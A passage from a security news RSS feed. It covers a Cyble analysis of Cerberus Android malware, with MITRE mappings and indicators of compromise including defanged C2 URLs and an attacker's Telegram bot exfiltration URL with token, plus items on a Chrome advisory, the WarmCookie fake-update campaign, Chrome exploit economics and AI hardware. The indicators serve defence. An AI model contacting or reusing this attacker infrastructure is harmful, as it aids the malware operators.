<td><strong>Discovery (</strong><a href="https://attack.mitre.org/tactics/TA0032">TA0032</a><strong>)</strong></td>
<td>System Information Discovery (<a href="https://attack.mitre.org/techniques/T1426/">T1426</a>)</td>
<td>The malware collects basic device information.</td>
</tr>
<tr>
<td><strong>Collection (</strong><a href="https://attack.mitre.org/tactics/TA0035/">TA0035</a><strong>)</strong></td>
<td>Screen Capture (<a href="https://attack.mitre.org/techniques/T1513/">T1513</a>)</td>
<td>Malware can record screen content</td>
</tr>
<tr>
<td><strong>Collection (</strong><a href="https://attack.mitre.org/tactics/TA0035/">TA0035</a><strong>)</strong><strong></strong></td>
<td>Audio Capture (<a href="https://attack.mitre.org/techniques/T1429/">T1429</a>)</td>
<td>Malware captures Audio recordings</td>
</tr>
<tr>
<td><strong>Collection (</strong><a href="https://attack.mitre.org/tactics/TA0035/">TA0035</a><strong>)</strong><strong></strong></td>
<td>Call Control (<a href="https://attack.mitre.org/techniques/T1616/">T1616</a>)</td>
<td>Malware can make calls</td>
</tr>
<tr>
<td><strong>Collection (</strong><a href="https://attack.mitre.org/tactics/TA0035/">TA0035</a><strong>)</strong><strong></strong></td>
<td>Protected User Data: Contact List (<a href="https://attack.mitre.org/techniques/T1636/003/">T1636.003</a>)</td>
<td>Malware steals contacts</td>
</tr>
<tr>
<td><strong>Collection (</strong><a href="https://attack.mitre.org/tactics/TA0035/"><strong>TA0035</strong></a><strong>)</strong></td>
<td>Protected User Data: SMS Messages<br />(<a href="https://attack.mitre.org/techniques/T1636/004/">T1636.004</a>)</td>
<td>Steals SMSs from the infected device</td>
</tr>
<tr>
<td><strong>Command and Control (</strong><a href="https://attack.mitre.org/tactics/TA0037">TA0037</a><strong>)</strong></td>
<td>Dynamic Resolution:&nbsp;Domain Generation Algorithms (<a href="https://attack.mitre.org/techniques/T1637/001/">T1637.001</a>)</td>
<td>Malware has implemented DGA</td>
</tr>
<tr>
<td><strong>Command and Control (</strong><a href="https://attack.mitre.org/tactics/TA0037">TA0037</a><strong>)</strong></td>
<td>Encrypted Channel:&nbsp;Symmetric Cryptography (<a href="https://attack.mitre.org/techniques/T1521/001/">T1521.001</a>)</td>
<td>Malware uses RC4 for encrypting C&amp;C communication</td>
</tr>
<tr>
<td><strong>Exfiltration (</strong><a href="https://attack.mitre.org/tactics/TA0036/"><strong>TA0036</strong></a><strong>)</strong></td>
<td>Exfiltration Over C2 Channel (<a href="https://attack.mitre.org/techniques/T1646/">T1646</a>)</td>
<td>Sending exfiltrated data over C&amp;C server</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><strong>Indicators of Compromise (IOCs)</strong></h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>Indicators</strong></td>
<td><strong>Indicator Type</strong></td>
<td><strong>Description</strong></td>
</tr>
<tr>
<td>0c27ec44ad5333b4440fbe235428ee58f623a878baefe08f2dcdad62ad5ffce7 9373860987c13cff160251366d2c6eb5cbb3867e 0544cc3bcd124e6e3f5200416d073b77</td>
<td>SHA256 SHA1 MD5</td>
<td>Session-based dropper</td>
</tr>
<tr>
<td>880c9f65c5e2007bfed3a2179e64e36854266023a00e1a7066cbcf8ee6c93cbc cb6f9bcd4b491858583ee9f10b72c0582bf94ab1 d9763c68ebbfaeef4334cfefc54b322f<strong></strong></td>
<td>SHA256 SHA1 MD5</td>
<td>Second-stage dropper</td>
</tr>
<tr>
<td>6c045a521d4d19bd52165ea992e91d338473a70962bcfded9213e592cea27359 c7ebf2adfd6482e1eb2c3b05f79cdff5c733c47b f9d5b402acee67675f87d33d7d52b364</td>
<td>SHA256 SHA1 MD5</td>
<td>Final undetected Cerberus payload</td>
</tr>
<tr>
<td><strong>hxxp://cmsspain[.homes</strong> <strong>hxxp://consulting-service-andro[.ru</strong> <strong>hxxp://cmscrocospain[.shop</strong> <strong>hxxp://cmsspain[.lol</strong> <strong>hxxp://cmsspain[.shop</strong></td>
<td>URL</td>
<td>C&amp;C server</td>
</tr>
<tr>
<td><strong>hxxp://elstersecure-plus[.online</strong> <strong>hxxps://secure-plus[.online/ElsterSecure[.apk</strong></td>
<td>URL</td>
<td>Distribution and phishing URL</td>
</tr>
<tr>
<td><strong>hxxps://api[.telegram[.org/bot7779906180:AAE3uTyuoDX0YpV1DBJyz5zgwvvVg-up4xo/sendMessage?chat_id=5915822121&amp;text=</strong></td>
<td>URL</td>
<td>Telegram bot URL</td>
</tr>
<tr>
<td>4c7f90d103b54ba78b85f92d967ef4cdcc0102d3756e1400383e774d2f27bb2e 8f3e3a2a63110674ea63fb6abe4a1889fc516dd6851e8c47298c7987e67ff9b6 c570e075f9676e79a1c43e9879945f4fe0f54ef5c78a5289fe72ce3ef6232a14 a2c701fcea4ed167fdb3131d292124eb55389bc746fcef8ca2c8642ba925895c 8faa93be87bb327e760420b2faa33f0f972899a47c80dc2bc07b260c18dfcb14 ee87b4c50e5573cba366efaa01b8719902b8bed8277f1903e764f9b4334778d0 136d00629e8cd59a6be639b0eaef925fd8cd68cbcbdb71a3a407836c560b8579 6c045a521d4d19bd52165ea992e91d338473a70962bcfded9213e592cea27359 516282073b7d81c630d4c5955d396e1e47a2f476f03dea7308461fa62f465c11 5bd21d0007d34f67faeb71081309e25903f15f237c1f7b094634584ca9dd873e 880c9f65c5e2007bfed3a2179e64e36854266023a00e1a7066cbcf8ee6c93cbc 0c27ec44ad5333b4440fbe235428ee58f623a878baefe08f2dcdad62ad5ffce7 6b8911dfdf1961de9dd2c3f9b141a6c5b1029311c66e9ded9bca4d21635c0c49 befe69191247abf80c5a725e1f1024f7195fa85a7af759db2546941711f6e6ae 9d966baefa96213861756fde502569d7bba9c755d13e586e7aaca3d0949cbdc3</td>
<td>SHA256</td>
<td>Malicious First and second-stage files from the&nbsp;ErrorFather campaign</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p>The post <a href="https://cyble.com/blog/hidden-in-plain-sight-errorfathers-deadly-deployment-of-cerberus/" rel="nofollow">Hidden in Plain Sight: ErrorFather&#8217;s Deadly Deployment of Cerberus</a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Mon, 14 Oct 2024 13:32:17 +0000</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-113</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-113</guid>
<content:encoded><![CDATA[
<p><span style="color: black;">Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for arbitrary code execution. Successful exploitation of the most severe of these vulnerabilities could allow for arbitrary code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</span></p>
]]></content:encoded>
<pubDate>Tue, 08 Oct 2024 18:27:01 -0400</pubDate>
</item>
<item>
<title>New FakeUpdate Cyber Campaign Spreads Updated WarmCookie Backdoor in France</title>
<link>https://www.cysecurity.news/2024/10/new-fakeupdate-cyber-campaign-spreads.html</link>
<guid>https://www.cysecurity.news/2024/10/new-fakeupdate-cyber-campaign-spreads.html</guid>
<content:encoded><![CDATA[
<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUUyV3NYkNzcCIl5LLjG7_buH8CdbrTXaIWUoJ3HgHC7U8UNrU2lnn-P8YuiP4Xwwg0tkEDwCCc5dsNPRQX_fgxsXucGKCgVNvuHsSfp5cVp_s7Qo3u6fPXtBFYh_9HRjO6syw406dz9o7tG-rnWii0SjUXSNN6mbhJplOAjgw9VmH7qf_GsEpi1YXbJI/s4008/pexels-tima-miroshnichenko-5380589.jpg" style="display: block; padding: 1em 0px; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUUyV3NYkNzcCIl5LLjG7_buH8CdbrTXaIWUoJ3HgHC7U8UNrU2lnn-P8YuiP4Xwwg0tkEDwCCc5dsNPRQX_fgxsXucGKCgVNvuHsSfp5cVp_s7Qo3u6fPXtBFYh_9HRjO6syw406dz9o7tG-rnWii0SjUXSNN6mbhJplOAjgw9VmH7qf_GsEpi1YXbJI/s600/pexels-tima-miroshnichenko-5380589.jpg" width="600" /></a></div><div style="text-align: justify;">A new wave of cyberattacks is targeting users in France, exploiting fake browser and software update prompts to spread an updated version of the WarmCookie backdoor. The campaign, dubbed “FakeUpdate,” has been linked to the SocGolish threat group, known for using compromised or fake websites to display deceptive update messages for popular applications like Google Chrome, Mozilla Firefox, Microsoft Edge, and Java.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">When users fall for these fake update alerts and click on them, malicious software is installed on their systems instead of a legitimate update. This payload includes tools like info-stealers, remote access trojans (RATs), cryptocurrency drainers, and ransomware.

According to researchers from Gen Threat Labs, the WarmCookie backdoor being distributed in this campaign is more advanced than its previous versions.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Initially discovered by cybersecurity firm eSentire in 2023, WarmCookie is designed to steal data, capture screenshots, run arbitrary commands, and drop additional malicious files. In this latest campaign, it has been updated with new features, such as the ability to run DLLs from a system’s temporary folder and execute PowerShell and EXE files.

The infection chain begins when users click on fake update prompts that closely mimic legitimate update notifications.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Once clicked, a JavaScript file triggers the download of the WarmCookie installer, which bypasses security checks and installs the backdoor. The malware can evade detection through anti-virtual machine (anti-VM) checks, ensuring it’s not being monitored by security analysts before sending system data to its command and control (C2) server.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">While the attackers are primarily using compromised websites to distribute these fake updates, researchers also identified malicious domains designed to look like official update sites, such as “edgeupdate[.]com” and “mozilaupgrade[.]com.”

Experts warn that legitimate browsers, including Chrome, Edge, and Firefox, update automatically and do not require users to manually download update files.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Any pop-up asking users to do so should be viewed with suspicion and avoided.</div>
]]></content:encoded>
<pubDate>2024-10-07T11:40:38.186-04:00</pubDate>
</item>
<item>
<title>Evaluating Mitigations &amp; Vulnerabilities in Chrome</title>
<link>http://security.googleblog.com/2024/10/evaluating-mitigations-vulnerabilities.html</link>
<guid>http://security.googleblog.com/2024/10/evaluating-mitigations-vulnerabilities.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Alex Gough, Chrome Security Team</span>

<p>
The Chrome Security Team is constantly striving to make it safer to browse the web. We invest in mechanisms to make classes of security bugs impossible, mitigations that make it more difficult to exploit a security bug, and sandboxing to reduce the capability exposed by an isolated security issue. When choosing where to invest it is helpful to consider how bad actors find and exploit vulnerabilities. In this post we discuss several axes along which to evaluate the potential harm to users from exploits, and how they apply to the Chrome browser.
</p>
<p>
Historically the Chrome Security Team has made major investments and driven the web to be safer. We pioneered browser <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/design/sandbox.md">sandboxing</a>, <a href="https://security.googleblog.com/2021/07/protecting-more-with-site-isolation.html">site isolation</a> and the <a href="https://blog.chromium.org/2023/08/towards-https-by-default.html">migration to an encrypted web</a>. Today we’re investing in <a href="https://security.googleblog.com/2023/01/supporting-use-of-rust-in-chromium.html">Rust for memory safety</a>, hardening our existing C++ code-base, and improving detection with <a href="https://chromium.googlesource.com/chromium/src.git/+/HEAD/docs/gwp_asan.md">GWP-asan</a> and <a href="https://docs.google.com/document/d/1PE2tykvGqBJW3UpNcnOUwDHkkRAuNyfM5EHWDTNQ2VQ/edit?tab=t.0#heading=h.b966ynmd5x2b">lightweight use-after-free</a> (UAF) detection. Considerations of user-harm and attack utility shape our vulnerability <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/severity-guidelines.md">severity guidelines</a> and payouts for bugs reported through our <a href="https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/vrp-faq.md">Vulnerability Rewards Program</a>. In the longer-term the Chrome Security Team advocates for operating system improvements like less-capable lightweight processes, less-privileged GPU and NPU containers, improved application isolation, and support for hardware-based isolation, memory safety and flow control enforcement.
</p>
<p>
When contemplating a particular security change it is easy to fall into a trap of security nihilism. It is tempting to reject changes that do not make exploitation impossible but only make it more difficult. However, the scale we are operating at can still make incremental improvements worthwhile. Over time, and over the population that uses Chrome and browsers based on Chromium, these improvements add up and impose real costs on attackers.
</p>
<h3>Threat Model for Code Execution</h3>


<p>
Our primary security goal is to make it safe to click on links, so people can feel confident browsing to pages they haven’t visited before. This document focuses on vulnerabilities and exploits that can lead to code execution, but the approach can be applied when mitigating other risks.
</p>
<p>
Attackers usually have some ultimate goal that can be achieved by executing their code outside of Chrome’s sandboxed or restricted processes. Attackers seek information or capabilities that we do not intend to be available to websites or extensions in the sandboxed renderer process. This might include executing code as the user or with system privileges, reading the memory of other processes, accessing credentials or opening local files. In this post we focus on attackers that start with JavaScript or the ability to send packets to Chrome and end up with something useful. We restrict discussion to memory-safety issues as they are a focus of current hardening efforts.
</p>
<h1 style="text-align: left;">User Harm ⇔ Attacker Utility</h1>


<p>
Chrome Security can scalably reduce risks to users by reducing attackers’ freedom of movement. Anything that makes some class of attackers’ ultimate goals more difficult, or (better) impossible, has value. People using Chrome have multiple, diverse adversaries. We should avoid thinking only about a single adversary, or a specific targeted user, the most advanced-persistent attackers or the most sophisticated people using the web. Chrome’s security protects a spectrum of people from a spectrum of attackers and risks. Focussing on a single bug, vector, attacker or user ignores the scale at which both Chrome and its attackers are operating. Reducing risks or increasing costs for even a fraction of threat scenarios helps someone, somewhere, be safer when using the web.
</p>
<p>
There are still better exploits for attackers and we should recognise and prioritize efforts that meaningfully prevent or fractionally reduce the availability or utility of the best bugs and escalation mechanisms.
</p>
<h3>Good Bugs and Bad Bugs</h3>


<p>
All bugs are bad bugs but some bugs are more amenable to exploitation. High value bugs and escalation mechanisms for attackers have some or all of the following attributes:
</p>
<div style="text-align: left;"><b>Reliable</b></div>


<p>
An exploit that sometimes crashes, or that when launched only sometimes allows for exploitation, is less useful than one that can be mechanically triggered in all cases. Crashes might lead to detection by the target or by defenders that collect the crashes. Attackers might not always have more than one chance to launch their attacks. Bugs that only surface when different threads must do things in a certain order require more use of resources or time to trigger. If attackers are willing to risk detection by causing a crash they can retry their attacks as Chrome uses a multi-process architecture for cross-domain iframes. Conversely, bugs that only occur when the main browser process shuts down are more difficult to trigger as attackers get a single attempt per session.
</p>
<div style="text-align: left;"><b>Low-interaction</b></div>


<p>
Chrome exists so that people can visit websites and click on links so we take that as our baseline for minimal interaction. Exploits that only work if a user performs an action, even if that action might be expected, are more risky for an attacker. This is because the code expressing the bug must be resident on a system for longer, the exploit likely has a lower yield as the action won’t always happen, and the bug is less silent as the user might become suspicious if they seem to be performing actions they are not used to performing. 
</p>
<div style="text-align: left;"><b>Ubiquitous</b></div>


<p>
A bug that exists on several platforms and can be exploited the same way everywhere will be more useful than one which is only exploitable on one platform or needs to be ported to several platforms. Bugs that manifest on limited hardware types, or in fewer configurations, are only useful if the attacker has targets using them. Every bug an attacker has to integrate into their exploitation flow requires some ongoing maintenance and testing, so the fewer bugs needed the better. For Chrome some bugs only manifest on Linux, while others are present on all of our platforms. Chrome is one of the most ubiquitous software products today, but some of its libraries are even more widely used, so attackers may invest extra effort in finding and exploiting bugs in third party code that Chrome uses. Bugs that require a user to install an extension or rely on particular hardware configurations are less useful than ones reachable from any web page.
</p>
<div style="text-align: left;"><b>Fast</b></div>


<p>
Attacks that require more than a few seconds to set up or execute are less likely to succeed and more likely to be caught. It is more difficult to test and develop a reliable exploit using a slow bug as the compile-test-debug cycle will be stretched.
</p>
<div style="text-align: left;"><b>Scriptable</b></div>


<p>
Bugs that require an exploit to perform grooming or state manipulation to succeed are more valuable if their environment can be scripted. The closer the scripting is to the bug, the easier it is to control the context in which the bug will be triggered. Bugs deep in a codec, or a race in a thread the attacker does not control, are more difficult to script. Scriptable bugs are more easily integrated into an exploitation flow, while bugs that are not scriptable might only be useful if they can be integrated with a related <a href="https://langsec.org/papers/Bratus.pdf">weird machine</a>. Bugs that are adjacent to a scripting engine like JavaScript are easier to trigger - making some bugs in third party libraries more serious in Chrome than they might be in other contexts. Bugs in a tightly coupled API like WebGPU are easy to script. Chrome extensions can manipulate Chrome’s internal state and user-interface (for example, they can open, close and rearrange tabs), making some user-interaction scriptable.
</p>
<div style="text-align: left;"><b>Easy to Test</b></div>


<p>
Attackers need long-term confidence in their exploits, and will want to test them against changing versions of Chrome and the operating system running Chrome. Bugs that can be automatically reproduced in a test environment can be tested easily. Bugs that can only be triggered with user interaction, or after complex network calls, or that require interaction with third-party services are harder to test. They need a complex test environment, or a patched version of Chrome that mimics the environment in a way that triggers the bug. Maintaining this sort of system takes time and resources, making such bugs less attractive. Note that being scriptable relates to the environment of the bug. Scriptable environments lend themselves to easier testing.
</p>
<div style="text-align: left;"><b>Silent</b></div>


<p>
Bugs that cause side effects that can be detected are less useful than those which operate without alerting a user, modifying system state, emitting events, or causing repeatable and detectable network traffic. Side effects include metrics, crashes or slowdowns, pop ups &amp; prompts, system logs and artifacts like downloaded files. Side effects might not alert a specific target of an attack as it happens but might lead to later identification of targeted systems. A bug that several groups know about could be detected without the attacker’s knowledge, even if it seems to succeed.
</p>
<div style="text-align: left;"><b>Long-lived</b></div>


<p>
Attackers will prefer bugs that are not likely to be fixed or found by others. Analyzing and integrating a bug into an exploitation suite likely involves significant up-front work, and attackers will prefer bugs that are likely to last a long time. Many attackers sell exploits as a subscription service, and their economic model might be disrupted if they need to find bugs at a higher rate. Bugs recently introduced into a product, or that might be found with widely known fuzzing techniques, are likely to be found (and possibly fixed) faster.
</p>
<div style="text-align: left;"><b>Targeted</b></div>


<p>
Attackers will try to protect their exploits from discovery and will prefer bugs that can be triggered only when they are confident they will only be exposed to chosen targets. It is relatively easy to fingerprint a web user using cookies, network knowledge and features of the web platform. Removing classes of delivery mechanisms (e.g. no unencrypted HTTP) can make it more difficult to target every exploit.
</p>
<div style="text-align: left;"><b>Easy to escalate</b></div>


<p>
Modern browsers do have several mitigations that make it more difficult to exploit some bugs or bug classes. Attackers usually must take the primitives offered by a bug, then control them to achieve a sub-goal like executing arbitrary system calls. Some bugs won’t chain well to a follow-on stage, or might need significant integration effort or tooling to allow a follow-on stage to proceed. The utility of some bugs is related to how well they couple with later escalation or lateral movement mechanisms. Some bugs by themselves are not useful — but can be combined with other bugs to make them reliable or feasible. Many info leaks fit into this category. A stable read-what-where primitive or a way to probe which memory is allocated makes an arbitrary write easier to execute. If a particular escalation technique crops up often in exploit chains or examples it is worth seeing if it can be remediated.
</p>
<div style="text-align: left;"><b>Easy to find</b></div>


<p>
This may be counter-intuitive but a bug that is easy to find can be useful until Chrome finds and fixes it and potential targets update. Chrome’s source code is publicly available and attackers can look for recent security or stability fixes and exploit them until the fixes are rolled out (N-days). Fuzzing finds the shallow bugs but does not hit those with even simple state requirements that are still amenable to manual discovery. An attacker may choose to specialize in finding bugs in a particular area that does not otherwise receive much security attention. Finally attackers might introduce the bug themselves in a library (a supply-chain attack).
</p>
<div style="text-align: left;"><b>Difficult to find</b></div>


<p>
Some bugs might be easy to find for an attacker because they created the bug, or difficult to find because they are in an under-studied area of the code base, or behind state that is difficult to fuzz. This makes the bug, once found, more valuable as it is likely to be long-lived as other actors will be less likely to find it. Attackers willing to reverse engineer and target closed-source components of Chrome may have access to vulnerabilities that the wider security community are unlikely to discover.
</p>
<h1 style="text-align: left;">Attacker Goals &amp; Economics</h1>


<p>
Some attackers have a business model, others have a budget. Coarsely we worry about attackers that want to make money, and attackers that want to spy on people. Bugs and escalation mechanisms are useful to either group if they are well suited to their way of working. We can evaluate mitigations against different attacker's differing economic models. An unsophisticated actor targeting unsophisticated users might use a widely delivered unreliable attack with a low yield (e.g. encouraging people to run a malicious download). They only need to win a small fraction of the time. Other groups may do limited bug discovery but instead take short-lived, already-fixed bugs and integrate them into exploit kits. Some attackers could be modeled as having an infinite budget but they will still choose the cheapest most reliable mechanism to achieve their goals. The deprecation of Flash and the subsequent move to exploiting v8 perhaps best illustrates this.
</p>
<p>
When deploying mitigations or removing attack-surface we are ultimately trying to hinder adversaries from achieving their goals. Some attackers might make different decisions if the economics of their operations are changed by reducing the yield of the bugs that enable their activities. Some actors may be willing to devote substantial resources to maintaining a capability to target people using the web - and we can only speculate about their response to changes we introduce. For these sophisticated attackers, removing whole classes of vulnerabilities or escalation mechanisms will be more effective.
</p>
<h1 style="text-align: left;">Avoid linear thinking</h1>


<p>
We perceive successful exploits as chains — linear steps that start with a bug, proceed through various escalation stages, and achieve an attacker’s immediate goal of code execution or data access outside the sandboxed renderer process. We even ask for such chains through our Vulnerability Rewards Programme. For example, a JS type confusion allows for an out of bounds read/write in the v8 sandbox, a v8 sandbox escape bug allows read/write in the renderer, overwriting a JIT write/execute region allows for arbitrary code execution, and calls to system or browser APIs lead to a browser sandbox escape. The attacker starts with the ability to serve JavaScript to a Chrome user, and ends up with unconstrained code execution on the user’s device, presumably to later use this to meet their higher-level goals. Even useful models of layered defense tend to focus on limited paths that trigger an incident (like the single arrow often drawn piercing <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC1298298/">slices of swiss-cheese</a>).
</p>
<p>
In reality the terrain presented to the universe of attackers is a complex web of latent possibilities, some known to some, and many yet to be discovered. This is more than ‘attackers think in graphs’, as we must acknowledge that a defensive intervention can succeed even if it does not prevent every attacker from reaching every possible person they wish to exploit.
</p>
<h1 style="text-align: left;"><b>
Conclusion
</b></h1>
<p>
It is tempting to reject a mitigation or removal of attack surface on the basis that attackers can simply find another way to achieve their goals. However this mindset presumes the most sophisticated attackers and their most desired targets. Our frame of analysis should be wider. We must recognize that many attackers have limited capability and expertise. Some may graft N-days onto red team tools. Some may have an expert or an exploit pipeline that performs well on a small subset of the Chrome codebase, but need training or more resources to obtain useful bugs if their current domain is taken away. Some will sell exploit kits that need rewriting if an escalation mechanism is removed. Previously reliable exploits might become less reliable, or take longer. Making life more difficult for attackers helps protect people using Chrome.
</p>
<p>
Although we argue that we should not “give up” on mitigations for escalation paths, it is still clearly more important to implement mitigations that make it impossible or difficult to trigger wide classes of initial vulnerabilities, or bypass a significant fraction of mitigations. Reported attacks always start with an initial vulnerability so it is tempting to invest all of our effort there, but this neglects beneficial interventions later in the attack mesh. Reductions in attacker utility translate to increases in attacker costs and reduction in aggregate risk.
</p>
<p>
A mitigation or bug-reduction mechanism that affects any of the axes of utility outlined above has some value to some of the people using Chrome. 
</p>
<h2>Resources</h2>


<ul>

<li><a href="https://googleprojectzero.blogspot.com/2015/06/what-is-good-memory-corruption.html">Project Zero: What is a "good" memory corruption vulnerability?</a> 

</li><li><a href="https://blog.isosceles.com/an-introduction-to-exploit-reliability/">An Introduction to Exploit Reliability</a>  &amp; <a href="https://blog.isosceles.com/what-is-a-good-linux-kernel-bug/">What is a "good" Linux Kernel bug?</a> (Isosceles)

</li><li><a href="https://securitycryptographywhatever.com/2024/06/24/mdowd/">Zero Day Markets with Mark Dowd</a> (Security Cryptography Whatever podcast)

</li><li>Escaping the Sandbox (Chrome and Adobe Pdf Reader) on Windows, Zer0Con 2024, Zhiniang Peng, R4nger, Q4n

</li><li><a href="https://www.cisa.gov/resources-tools/resources/exploring-memory-safety-critical-open-source-projects">Exploring Memory Safety in Critical Open Source Projects</a> (CISA.gov)</li></ul>
]]></content:encoded>
<pubDate>2024-10-03T12:03:16.344-04:00</pubDate>
</item>
<item>
<title>Trends: Hardware gets AI updates in 2024</title>
<link>https://securityintelligence.com/articles/trends-hardware-gets-ai-updates-2024/</link>
<guid>https://securityintelligence.com/articles/trends-hardware-gets-ai-updates-2024/</guid>
<content:encoded><![CDATA[
<p>The surge in artificial intelligence (AI) usage over the past two and a half years has dramatically changed not only software but hardware as well. As AI usage continues to evolve, PC makers have found in AI an opportunity to improve end-user devices by offering AI-specific hardware and marketing them as &ldquo;AI PCs.&rdquo;</p>
<h2>Pre-AI hardware, adapted for AI</h2>
<p>A few years ago, <a href="https://www.ibm.com/topics/artificial-intelligence" rel="noopener nofollow" target="_blank">AI</a> often depended on hardware that was not explicitly designed for AI. One example is graphics processors. Nvidia Graphics Processing Units (GPUs) are crucial in AI because they handle parallel processing efficiently, which is necessary for <a href="https://www.ibm.com/topics/machine-learning" rel="noopener nofollow" target="_blank">machine learning</a> and deep learning. Their design enables simultaneous calculations, making them more effective than CPUs for AI model training and inference.</p>
<p>Another primary hardware type is the Field-Programmable Gate Array (FPGA) from Intel and other companies. An FPGA is an integrated circuit (IC) that can be reprogrammed multiple times. That flexibility makes it ideal for AI tasks. FPGAs accelerate deep learning and machine learning tasks. They provide hardware customization options that mimic the behavior of GPUs or ASICs.</p>
<p>FPGAs can be integrated with popular AI frameworks like TensorFlow and PyTorch using tools like the Intel FPGA AI Suite and the OpenVINO toolkit.</p>
<p>FPGAs are used across the automotive, healthcare and other industries. They are useful in edge computing scenarios where AI capabilities must be deployed close to the data source for faster decision-making and reduced latency.</p>
<p>And yet another type is Application-Specific Integrated Circuits (ASICs). One example is Google&rsquo;s Tensor Processing Units (TPUs). TPUs are custom ASICs developed by Google to accelerate machine learning workloads. They are optimized for TensorFlow and used extensively in Google&rsquo;s data centers.</p>
<h2>How the generative AI revolution changed hardware</h2>
<p>OpenAI&rsquo;s release of ChatGPT on November 30, 2022, changed the public&rsquo;s and industry&rsquo;s relationship with AI. ChatGPT quickly gained immense popularity, attracting more than one million users within five days of release. By January 2023, it had reached <a href="https://securityintelligence.com/articles/chatgpt-and-the-race-to-secure-your-intellectual-property/" rel="noopener nofollow" target="_blank">100 million users</a>, making it the fastest-growing consumer application ever.</p>
<p>Most importantly, the runaway success of ChatGPT in the general culture changed venture funding in favor of AI startups. Big tech giants like Microsoft, Google and Meta accelerated the development and public availability of their offerings, and Silicon Valley quickly saw the emergence of companies like Anthropic and Perplexity offering <a href="https://www.ibm.com/artificial-intelligence" rel="noopener nofollow" target="_blank">AI tools</a>.</p>
<p>Now, PC manufacturers are investing in AI-capable PCs that emphasize hybrid AI and on-device intelligence. The integration of AI into personal computers is facilitated by the emergence of specialized AI chipsets, such as neural processing units (NPUs), which enhance PCs&rsquo; ability to perform AI tasks locally.</p>
<p>This shift is expected to impact the PC market significantly. Some 60% of PCs shipped by 2027 will be AI-capable, <a href="https://canalys.com/reports/AI-PC-market-forecasts" rel="noopener nofollow" target="_blank">according to Canalys</a>.</p>
<a class="btn orange1 large" href="https://www.ibm.com/ai-cybersecurity?mhsrc=ibmsearch_a&amp;mhq=AI%20cybersecurity">Explore AI cybersecurity solutions</a>
<h2>How do AI PCs differ?</h2>
<p>AI PCs are designed to efficiently execute AI workloads using a combination of CPUs, GPUs and NPUs, allowing them to handle tasks such as <a href="https://www.ibm.com/topics/generative-ai" rel="noopener nofollow" target="_blank">generative AI</a> models more effectively than previous PC generations. This optimization enables AI PCs to run AI applications with improved performance, power efficiency and privacy by processing data locally rather than relying on cloud-based solutions.</p>
<p>Some criticize this category as a marketing gimmick and point out that many end users use generative AI through cloud-based chatbots.</p>
<p>Today, the public thinks of AI as <a href="https://www.ibm.com/topics/large-language-models" rel="noopener nofollow" target="_blank">large language models (LLMs)</a> running in the cloud and used as chatbots. Over time, the power and usage of AI by end users will increasingly take place via integrated features and AI-enhanced applications.</p>
<p><a href="https://www.youtube.com/watch?v=u2nJsKvFcps" rel="noopener nofollow" target="_blank">According to Gartner Global Chief of Research Chris Howard</a>, AI will also involve more small language models (SLMs) powering non-chatbot use cases running close to the edge rather than the cloud.</p>
<p>AI processing will increasingly happen closer to the user and closer to the edge. And this means the trend of AI-specific hardware will only grow.</p>
<h2>Microsoft AI</h2>
<p>One standout is the introduction of Microsoft&rsquo;s Copilot+ PCs, a new category of Windows PCs specifically designed for AI. These PCs feature new silicon capable of performing over 40 trillion operations per second (TOPS), providing all-day battery life and access to advanced AI models. The architecture of these devices integrates a high-performance NPU alongside the CPU and GPU, enhancing their AI capabilities. This configuration allows for new experiences such as real-time AI image generation, language translation and advanced search functionalities like the &ldquo;Recall&rdquo; feature, which records and analyzes device activity to improve user interaction with AI models.</p>
<p>Microsoft has also collaborated with major OEM partners, including Acer, ASUS, Dell, HP, Lenovo and Samsung, to bring these AI-enhanced devices to market.</p>
<h2>Apple AI</h2>
<p>Apple has made several hardware changes to accommodate and empower AI capabilities in its devices. A significant development is the integration of Apple silicon, specifically designed to handle advanced AI processing. This includes the use of specialized neural engines in devices like the iPhone 15 Pro, which are optimized for AI tasks such as machine learning and <a href="https://www.ibm.com/topics/natural-language-processing" rel="noopener nofollow" target="_blank">natural language processing</a>. These neural engines enhance the efficiency and speed of AI operations, enabling features like real-time language translation and image recognition.</p>
<h2>Google AI</h2>
<p>Google has made several changes to its hardware to accommodate AI. One of the significant steps includes developing and integrating its own hardware to support AI models like Gemini. This indicates a shift from relying on external chips to using proprietary technology to enhance AI capabilities.</p>
<p>Google has even reorganized its internal teams to integrate AI across its products better. This reorganization has led to the creation of a new Platforms and Devices team, consolidating various Google products like Pixel, Android, Chrome and ChromeOS under a single leadership. This move aims to accelerate AI integration and improve the synergy between hardware and software.</p>
<h2>The AI hardware revolution</h2>
